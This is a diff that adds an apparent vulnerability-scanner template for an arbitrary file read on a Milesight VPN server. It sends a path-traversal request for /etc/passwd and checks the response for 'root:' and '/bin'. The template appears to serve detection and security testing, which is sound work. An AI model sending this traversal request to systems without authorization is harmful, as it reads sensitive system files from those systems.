@@ -1,0 +1,25 @@
+id: milesight-vpn-server-file-read
+info:
+  name: Milesight VPN server Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/bin"
+          - "root:"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
